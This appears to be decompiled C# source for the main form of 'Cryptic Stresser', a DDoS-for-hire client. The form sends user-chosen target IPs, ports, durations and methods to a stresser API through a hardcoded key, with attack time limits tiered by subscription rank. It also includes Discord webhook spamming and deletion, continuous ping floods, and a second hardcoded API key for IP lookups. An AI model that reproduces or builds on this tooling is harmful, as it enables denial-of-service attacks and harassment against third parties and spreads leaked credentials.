using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Auth.GG_Winform_Example;
using DiscordRpcDemo;
using Guna.UI2.AnimatorNS;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using ProcessBlocking;

namespace Cryptic_Stresser
{
	// Token: 0x02000010 RID: 16
	public partial class MainHub : Form
	{
		// Token: 0x17000001 RID: 1
		// (get) Token: 0x06000047 RID: 71 RVA: 0x0000222A File Offset: 0x0000042A
		// (set) Token: 0x06000048 RID: 72 RVA: 0x00002232 File Offset: 0x00000432
		public string State { get; private set; }

		// Token: 0x06000049 RID: 73 RVA: 0x0000223B File Offset: 0x0000043B
		public MainHub()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600004A RID: 74 RVA: 0x0000206C File Offset: 0x0000026C
		private void pictureBox3_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004B RID: 75 RVA: 0x000068BC File Offset: 0x00004ABC
		private void siticoneCirclePictureBox1_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Filter = "Image Files(*.jpg; *.png; *.jpeg; *.gif; *.bmp)|*.jpg; *.png; *.jpeg; *.gif; *.bmp)";
			bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				string fileName = openFileDialog.FileName;
				string path = Convert.ToBase64String(File.ReadAllBytes(fileName));
				API.UploadPic(User.Username, path);
				Form1 form = new Form1();
				form.Show();
				base.Hide();
			}
		}

		// Token: 0x0600004C RID: 76 RVA: 0x0000206C File Offset: 0x0000026C
		private void guna2Button5_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004D RID: 77 RVA: 0x00006920 File Offset: 0x00004B20
		private void MainHub_Load(object sender, EventArgs e)
		{
			this.siticoneCirclePictureBox1.Load(User.ProfilePicture);
			this.user.Text = (User.Username ?? "");
			this.handlers = default(DiscordRpc.EventHandlers);
			DiscordRpc.Initialize("910667330290343978", ref this.handlers, true, null);
			this.handlers = default(DiscordRpc.EventHandlers);
			DiscordRpc.Initialize("910667330290343978", ref this.handlers, true, null);
			this.handlers = default(DiscordRpc.EventHandlers);
			this.Welcome.Text = "Hello, " + User.Username + "!";
			this.label18.Text = "Username: " + User.Username;
			this.Discord.Text = "Discord: " + User.Email;
			this.yo.Text = "Rank: " + User.Rank;
			this.label16.Text = "ID: " + User.ID;
			string text = App.GrabVariable("bXjj759zxdDHU2QYAlAce0MTCdqC3");
			this.apicounttext.Text = text;
			string text2 = App.GrabVariable("44lfN2a4tulnjgwMYrqODXrKskA1D");
			this.methodtext.Text = text2;
		}

		// Token: 0x0600004E RID: 78 RVA: 0x00006A60 File Offset: 0x00004C60
		private void guna2Button2_Click(object sender, EventArgs e)
		{
			this.reg.Show(this.panel1, false, null);
			this.panel2.Hide();
			this.panel3.Hide();
			this.panel4.Hide();
			this.panel6.Hide();
		}

		// Token: 0x0600004F RID: 79 RVA: 0x0000206C File Offset: 0x0000026C
		private void panel1_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000050 RID: 80 RVA: 0x00006AB4 File Offset: 0x00004CB4
		private void guna2Button3_Click(object sender, EventArgs e)
		{
			this.reg.Show(this.panel2, false, null);
			this.panel1.Hide();
			this.panel3.Hide();
			this.panel4.Hide();
			this.panel6.Hide();
		}

		// Token: 0x06000051 RID: 81 RVA: 0x00006B08 File Offset: 0x00004D08
		private void guna2Button4_Click(object sender, EventArgs e)
		{
			this.reg.Show(this.panel3, false, null);
			this.panel2.Hide();
			this.panel1.Hide();
			this.panel4.Hide();
			this.panel6.Hide();
		}

		// Token: 0x06000052 RID: 82 RVA: 0x00006B5C File Offset: 0x00004D5C
		private void guna2Button1_Click(object sender, EventArgs e)
		{
			this.reg.Show(this.panel4, false, null);
			this.panel2.Hide();
			this.panel3.Hide();
			this.panel1.Hide();
			this.panel6.Hide();
		}

		// Token: 0x06000053 RID: 83 RVA: 0x00006BB0 File Offset: 0x00004DB0
		[DebuggerStepThrough]
		private Task startScan_ClickAsync(object sender, EventArgs e)
		{
			MainHub.<startScan_ClickAsync>d__18 <startScan_ClickAsync>d__ = new MainHub.<startScan_ClickAsync>d__18();
			<startScan_ClickAsync>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<startScan_ClickAsync>d__.<>4__this = this;
			<startScan_ClickAsync>d__.sender = sender;
			<startScan_ClickAsync>d__.e = e;
			<startScan_ClickAsync>d__.<>1__state = -1;
			<startScan_ClickAsync>d__.<>t__builder.Start<MainHub.<startScan_ClickAsync>d__18>(ref <startScan_ClickAsync>d__);
			return <startScan_ClickAsync>d__.<>t__builder.Task;
		}

		// Token: 0x06000054 RID: 84 RVA: 0x00006C04 File Offset: 0x00004E04
		private void guna2Button5_Click_1(object sender, EventArgs e)
		{
			string text = this.customip.Text;
			string text2 = this.cutomport.Text;
			string text3 = this.customtime.Text;
			string text4 = this.custommethod.Text;
			string rank = User.Rank;
			string username = User.Username;
			bool flag = rank == "7";
			if (flag)
			{
				bool flag2 = Convert.ToInt32(this.customtime.Text) > 1500;
				if (flag2)
				{
					this.msgtext.Text = "Attack Failed, Your Max Time is 1500";
					this.msg.BackColor = Color.Red;
					this.msgpanel.Show(this.msg, false, null);
					this.timeformsg.Start();
				}
				else
				{
					this.sendattack.Navigate(string.Concat(new string[]
					{
						"https://demonstresser.org/API/l4?key=c4829b85cd41eac65f745df1-58cec4ca&host=",
						this.customip.Text,
						"&port=",
						this.cutomport.Text,
						"&time=",
						this.customtime.Text,
						"&method=",
						this.custommethod.Text,
						"&pps=500000&threads=1"
					}));
					this.msgtext.Text = "Attack Sent ..";
					this.msg.BackColor = Color.Green;
					this.msgpanel.Show(this.msg, false, null);
					this.timeformsg.Start();
					this.logsapi.Text = string.Concat(new string[]
					{
						"IP:",
						this.customip.Text,
						"    |Port:",
						this.cutomport.Text,
						"    |Time:",
						text3,
						"     |Method:",
						this.custommethod.Text,
						"  |  Attack Sent>API - Server 1"
					});
				}
			}
			bool flag3 = rank == "2";
			if (flag3)
			{
				bool flag4 = Convert.ToInt32(this.customtime.Text) > 300;
				if (flag4)
				{
					this.msgtext.Text = "Attack Failed, Your Max Time is 300";
					this.msg.BackColor = Color.Red;
					this.msgpanel.Show(this.msg, false, null);
					this.timeformsg.Start();
				}
				else
				{
					this.sendattack.Navigate(string.Concat(new string[]
					{
						"https://demonstresser.org/API/l4?key=c4829b85cd41eac65f745df1-58cec4ca&host=",
						this.customip.Text,
						"&port=",
						this.cutomport.Text,
						"&time=",
						this.customtime.Text,
						"&method=",
						this.custommethod.Text,
						"&pps=500000&threads=1"
					}));
					this.msgtext.Text = "Attack Sent ..";
					this.msg.BackColor = Color.Green;
					this.msgpanel.Show(this.msg, false, null);
					this.timeformsg.Start();
					this.logsapi.Text = string.Concat(new string[]
					{
						"IP:",
						this.customip.Text,
						"    |Port:",
						this.cutomport.Text,
						"    |Time:",
						text3,
						"     |Method:",
						this.custommethod.Text,
						"  |  Attack Sent>API - Server 1"
					});
				}
			}
			bool flag5 = rank == "3";
			if (flag5)
			{
				bool flag6 = Convert.ToInt32(this.customtime.Text) > 600;
				if (flag6)
				{
					this.msgtext.Text = "Attack Failed, Your Max Time is 600";
					this.msg.BackColor = Color.Red;
					this.msgpanel.Show(this.msg, false, null);
					this.timeformsg.Start();
				}
				else
				{
					this.sendattack.Navigate(string.Concat(new string[]
					{
						"https://demonstresser.org/API/l4?key=c4829b85cd41eac65f745df1-58cec4ca&host=",
						this.customip.Text,
						"&port=",
						this.cutomport.Text,
						"&time=",
						this.customtime.Text,
						"&method=",
						this.custommethod.Text,
						"&pps=500000&threads=1"
					}));
					this.msgtext.Text = "Attack Sent ..";
					this.msg.BackColor = Color.Green;
					this.msgpanel.Show(this.msg, false, null);
					this.timeformsg.Start();
					this.logsapi.Text = string.Concat(new string[]
					{
						"IP:",
						this.customip.Text,
						"    |Port:",
						this.cutomport.Text,
						"    |Time:",
						text3,
						"     |Method:",
						this.custommethod.Text,
						"  |  Attack Sent>API - Server 1"
					});
				}
			}
			bool flag7 = rank == "4";
			if (flag7)
			{
				bool flag8 = Convert.ToInt32(this.customtime.Text) > 900;
				if (flag8)
				{
					this.msgtext.Text = "Attack Failed, Your Max Time is 900";
					this.msg.BackColor = Color.Red;
					this.msgpanel.Show(this.msg, false, null);
					this.timeformsg.Start();
				}
				else
				{
					this.sendattack.Navigate(string.Concat(new string[]
					{
						"https://demonstresser.org/API/l4?key=c4829b85cd41eac65f745df1-58cec4ca&host=",
						this.customip.Text,
						"&port=",
						this.cutomport.Text,
						"&time=",
						this.customtime.Text,
						"&method=",
						this.custommethod.Text,
						"&pps=500000&threads=1"
					}));
					this.msgtext.Text = "Attack Sent ..";
					this.msg.BackColor = Color.Green;
					this.msgpanel.Show(this.msg, false, null);
					this.timeformsg.Start();
					this.logsapi.Text = string.Concat(new string[]
					{
						"IP:",
						this.customip.Text,
						"    |Port:",
						this.cutomport.Text,
						"    |Time:",
						text3,
						"     |Method:",
						this.custommethod.Text,
						"  |  Attack Sent>API - Server 1"
					});
				}
			}
			bool flag9 = rank == "5";
			if (flag9)
			{
				bool flag10 = Convert.ToInt32(this.customtime.Text) > 1200;
				if (flag10)
				{
					this.msgtext.Text = "Attack Failed, Your Max Time is 1200";
					this.msg.BackColor = Color.Red;
					this.msgpanel.Show(this.msg, false, null);
					this.timeformsg.Start();
				}
				else
				{
					this.sendattack.Navigate(string.Concat(new string[]
					{
						"https://demonstresser.org/API/l4?key=c4829b85cd41eac65f745df1-58cec4ca&host=",
						this.customip.Text,
						"&port=",
						this.cutomport.Text,
						"&time=",
						this.customtime.Text,
						"&method=",
						this.custommethod.Text,
						"&pps=500000&threads=1"
					}));
					this.msgtext.Text = "Attack Sent ..";
					this.msg.BackColor = Color.Green;
					this.msgpanel.Show(this.msg, false, null);
					this.timeformsg.Start();
					this.logsapi.Text = string.Concat(new string[]
					{
						"IP:",
						this.customip.Text,
						"    |Port:",
						this.cutomport.Text,
						"    |Time:",
						text3,
						"     |Method:",
						this.custommethod.Text,
						"  |  Attack Sent>API - Server 1"
					});
				}
			}
			bool flag11 = rank == "6";
			if (flag11)
			{
				bool flag12 = Convert.ToInt32(this.customtime.Text) > 1500;
				if (flag12)
				{
					this.msgtext.Text = "Attack Failed, Your Max Time is 1500";
					this.msg.BackColor = Color.Red;
					this.msgpanel.Show(this.msg, false, null);
					this.timeformsg.Start();
				}
				else
				{
					this.sendattack.Navigate(string.Concat(new string[]
					{
						"https://demonstresser.org/API/l4?key=c4829b85cd41eac65f745df1-58cec4ca&host=",
						this.customip.Text,
						"&port=",
						this.cutomport.Text,
						"&time=",
						this.customtime.Text,
						"&method=",
						this.custommethod.Text,
						"&pps=500000&threads=1"
					}));
					this.msgtext.Text = "Attack Sent ..";
					this.msg.BackColor = Color.Green;
					this.msgpanel.Show(this.msg, false, null);
					this.timeformsg.Start();
					this.logsapi.Text = string.Concat(new string[]
					{
						"IP:",
						this.customip.Text,
						"    |Port:",
						this.cutomport.Text,
						"    |Time:",
						text3,
						"     |Method:",
						this.custommethod.Text,
						"  |  Attack Sent>API - Server 1"
					});
				}
			}
			bool flag13 = rank == "1";
			if (flag13)
			{
				bool flag14 = Convert.ToInt32(this.customtime.Text) > 60;
				if (flag14)
				{
					this.msgtext.Text = "Attack Failed, Your Max Time is 60";
					this.msg.BackColor = Color.Red;
					this.msgpanel.Show(this.msg, false, null);
					this.timeformsg.Start();
				}
				else
				{
					this.sendattack.Navigate(string.Concat(new string[]
					{
						"https://demonstresser.org/API/l4?key=c4829b85cd41eac65f745df1-58cec4ca&host=",
						this.customip.Text,
						"&port=",
						this.cutomport.Text,
						"&time=",
						this.customtime.Text,
						"&method=",
						this.custommethod.Text,
						"&pps=500000&threads=1"
					}));
					this.msgtext.Text = "Attack Sent .";
					this.msg.BackColor = Color.Green;
					this.msgpanel.Show(this.msg, false, null);
					this.timeformsg.Start();
					this.logsapi.Text = string.Concat(new string[]
					{
						"IP:",
						this.customip.Text,
						"    |Port:",
						this.cutomport.Text,
						"    |Time:",
						text3,
						"     |Method:",
						this.custommethod.Text,
						"  |  Attack Sent>API - Server 1"
					});
				}
			}
		}

		// Token: 0x06000055 RID: 85 RVA: 0x0000206C File Offset: 0x0000026C
		private void custommethod_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000056 RID: 86 RVA: 0x0000206C File Offset: 0x0000026C
		private void guna2GradientButton1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000057 RID: 87 RVA: 0x0000206C File Offset: 0x0000026C
		private void guna2Button8_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000058 RID: 88 RVA: 0x000077E0 File Offset: 0x000059E0
		private void guna2Button7_Click(object sender, EventArgs e)
		{
			this.reg.Show(this.panel6, false, null);
			this.panel2.Hide();
			this.panel1.Hide();
			this.panel4.Hide();
			this.panel3.Hide();
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00002253 File Offset: 0x00000453
		private void guna2GradientButton2_Click(object sender, EventArgs e)
		{
			this.guna2TextBox1.Text = "Expiry: " + User.Expiry;
		}

		// Token: 0x0600005A RID: 90 RVA: 0x0000206C File Offset: 0x0000026C
		private void panel4_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0600005B RID: 91 RVA: 0x00007834 File Offset: 0x00005A34
		private void timeformsg_Tick(object sender, EventArgs e)
		{
			bool visible = this.msg.Visible;
			if (visible)
			{
				this.msgpanel.Hide(this.msg, false, null);
				this.timeformsg.Stop();
			}
			else
			{
				this.timeformsg.Stop();
			}
		}

		// Token: 0x0600005C RID: 92 RVA: 0x00002271 File Offset: 0x00000471
		private void guna2GradientButton1_Click_1(object sender, EventArgs e)
		{
			Process.Start("https://auth.gg/portal/Cryptic%20Stresser");
		}

		// Token: 0x0600005D RID: 93 RVA: 0x00007884 File Offset: 0x00005A84
		private void spamurl_Tick(object sender, EventArgs e)
		{
			try
			{
				string str = DateTime.Now.ToString("hh:mm:ss");
				this.sendWebHook(this.url.Text, string.Concat(new string[]
				{
					this.spam.Text
				}), this.name.Text);
				this.logs.AppendText("Message Sent! - " + str + Environment.NewLine);
			}
			catch
			{
				string str2 = DateTime.Now.ToString("hh:mm:ss");
				this.logs.AppendText("Message Didn't Send - " + str2 + Environment.NewLine);
				this.spam.Text = "Start Spam";
				this.spamurl.Stop();
			}
		}

		// Token: 0x0600005E RID: 94 RVA: 0x0000227F File Offset: 0x0000047F
		private void sendWebHook(string text1, string v, string text2)
		{
			throw new NotImplementedException();
		}

		// Token: 0x0600005F RID: 95 RVA: 0x0000795C File Offset: 0x00005B5C
		private void guna2Button8_Click_1(object sender, EventArgs e)
		{
			bool flag = this.spam.Text == "Start Spam";
			if (flag)
			{
				this.spam.Text = "Stop Spam";
				this.spamurl.Start();
			}
			else
			{
				bool flag2 = this.spam.Text == "Stop Spam";
				if (flag2)
				{
					this.spam.Text = "Start Spam";
					this.spamurl.Stop();
				}
			}
		}

		// Token: 0x06000060 RID: 96 RVA: 0x000079DC File Offset: 0x00005BDC
		private void guna2Button5_Click_2(object sender, EventArgs e)
		{
			try
			{
				string str = DateTime.Now.ToString("hh:mm:ss");
				this.sendWebHook(this.url.Text, string.Concat(new string[]
				{
					this.spam.Text
				}), this.name.Text);
				this.logs.AppendText("Message Sent! - " + str + Environment.NewLine);
			}
			catch
			{
				string str2 = DateTime.Now.ToString("hh:mm:ss");
				MessageBox.Show("Your Spamming Webhook or Webhook Dose Not Exist", "Discord Webhook Alert", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				this.logs.AppendText("Message Didn't Send - " + str2 + Environment.NewLine);
			}
		}

		// Token: 0x06000061 RID: 97 RVA: 0x00002287 File Offset: 0x00000487
		private void guna2Button6_Click(object sender, EventArgs e)
		{
			this.logs.Text = "";
		}

		// Token: 0x06000062 RID: 98 RVA: 0x00007AA8 File Offset: 0x00005CA8
		private void guna2Button10_Click(object sender, EventArgs e)
		{
			try
			{
				Process[] processesByName = Process.GetProcessesByName("paping");
				bool flag = string.IsNullOrWhiteSpace(this.customip.Text) || string.IsNullOrWhiteSpace(this.cutomport.Text);
				if (!flag)
				{
					new Process
					{
						StartInfo = 
						{
							UseShellExecute = false,
							FileName = "paping.exe",
							Arguments = this.customip.Text + " -p " + this.cutomport.Text
						}
					}.Start();
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000063 RID: 99 RVA: 0x00007B60 File Offset: 0x00005D60
		private void guna2Button9_Click(object sender, EventArgs e)
		{
			string text = this.customip.Text;
			string arguments = "/K color 7 & mode con lines=20 cols=55 & ping " + text + " -t";
			Process.Start("CMD.exe", arguments);
		}

		// Token: 0x06000064 RID: 100 RVA: 0x0000206C File Offset: 0x0000026C
		private void guna2Button11_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000065 RID: 101 RVA: 0x0000229B File Offset: 0x0000049B
		private void guna2TrackBar1_Scroll(object sender, ScrollEventArgs e)
		{
			base.Opacity = (double)this.guna2TrackBar1.Value / (double)this.guna2TrackBar1.Maximum;
		}

		// Token: 0x06000066 RID: 102 RVA: 0x00007B9C File Offset: 0x00005D9C
		private void guna2GradientButton3_Click(object sender, EventArgs e)
		{
			Form1 form = new Form1();
			form.Show();
			base.Hide();
		}

		// Token: 0x06000067 RID: 103 RVA: 0x000022BE File Offset: 0x000004BE
		private void guna2Button11_Click_1(object sender, EventArgs e)
		{
			MessageBox.Show("In Development", "Cryptic Stresser");
		}

		// Token: 0x06000068 RID: 104 RVA: 0x00007BC0 File Offset: 0x00005DC0
		private void startScan_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string text = webClient.DownloadString("https://webresolver.nl/api.php?key=U47H9-A8R3J-5UNR1-4Z6M2&action=geoip&string=google.com");
			this.richTextBox1.Text = text;
		}

		// Token: 0x06000069 RID: 105 RVA: 0x000022D1 File Offset: 0x000004D1
		private void security_Tick(object sender, EventArgs e)
		{
			Protection.ProtectionCheck();
		}

		// Token: 0x0600006A RID: 106 RVA: 0x00007BF0 File Offset: 0x00005DF0
		private void guna2Button12_Click(object sender, EventArgs e)
		{
			string text = this.url.Text;
			WebRequest webRequest = WebRequest.Create(text);
			webRequest.Method = "DELETE";
			HttpWebResponse httpWebResponse = (HttpWebResponse)webRequest.GetResponse();
			object obj = httpWebResponse.StatusCode;
			MessageBox.Show("Delete Request To Given Webhook Has Been Sent", "Cryptic Stresser", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x0600006B RID: 107 RVA: 0x0000206C File Offset: 0x0000026C
		private void apicounttext_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600006C RID: 108 RVA: 0x00007C48 File Offset: 0x00005E48
		private void guna2Button14_Click(object sender, EventArgs e)
		{
			string text = this.customip.Text;
			string text2 = this.cutomport.Text;
			string text3 = this.customtime.Text;
			string text4 = this.custommethod.Text;
			this.sendattack.Navigate(string.Concat(new string[]
			{
				"https://demonstresser.org/API/l4?key=c4829b85cd41eac65f745df1-58cec4ca&host=[host]&port=[port]&time=[time]&method=[STOP]&pps=[pps]&threads=[thread",
				this.customip.Text,
				"&port=",
				this.cutomport.Text,
				"&time=",
				this.customtime.Text,
				"&method=",
				this.custommethod.Text,
				"&pps=500000&threads=1"
			}));
			this.msgtext.Text = "Attack Stopped ..";
			this.msg.BackColor = Color.Red;
			this.msgpanel.Show(this.msg, false, null);
			this.timeformsg.Start();
		}

		// Token: 0x0600006D RID: 109 RVA: 0x0000206C File Offset: 0x0000026C
		private void guna2Button13_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0400004F RID: 79
		private object JsonConvert;

		// Token: 0x04000050 RID: 80
		private DiscordRpc.EventHandlers handlers;

		// Token: 0x04000052 RID: 82
		private object presence;

		// Token: 0x04000053 RID: 83
		private string usersrank;
	}
}
